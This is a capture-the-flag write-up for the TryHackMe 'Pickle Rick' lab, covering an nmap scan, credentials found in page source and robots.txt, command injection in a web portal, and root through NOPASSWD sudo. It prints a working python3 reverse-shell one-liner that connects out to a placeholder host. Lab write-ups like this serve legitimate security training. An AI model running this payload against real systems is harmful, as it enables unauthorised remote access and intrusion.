# [Pickle Rick](https://tryhackme.com/room/picklerick)

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name | Pickle Rick |
| Difficulty | Easy |
| Tags | crf, dirbuster, linux|

```bash
export IP=<Machine_IP>
```

---

```bash
nmap -vvv -sC -sV -A -v -oN nmap/initial.nmap $IP
```
---

## Nmap scan :
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a1:4e:a3:4e:5c:f2:0f:6e:8d:2e:a8:0c:3c:9f:d4:ee (RSA)
|   256 95:91:a8:d8:ab:e4:0e:a4:8d:b8:43:27:01:58:b2:c2 (ECDSA)
|_  256 b6:f3:eb:2d:f1:c2:bc:b3:6b:c8:da:50:49:ac:27:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Portal  Creds :
```
Got the username from the source code
Username: R1ckRul3s

Got the password from robots.txt
Password: Wubbalubbadubdub
```
## Portal (LOGIN)
```
Used gobuster dir to get the login page
MACHINE_IP/portal.php
```

## How did i get in ?
```
The portal page or the command panel was infected with command injection so
i tried to get a rev shell with nc but didint work so i tried python2 didint work
so i tried python3 and it worked, i uploaded linpeas for more information and found out that all users has ((NOPASSWD))
i got root using the command (sudo bash).  
```
## python3 reverse shell :
`
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MACHINE_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
`

## root :
`
sudo bash
`
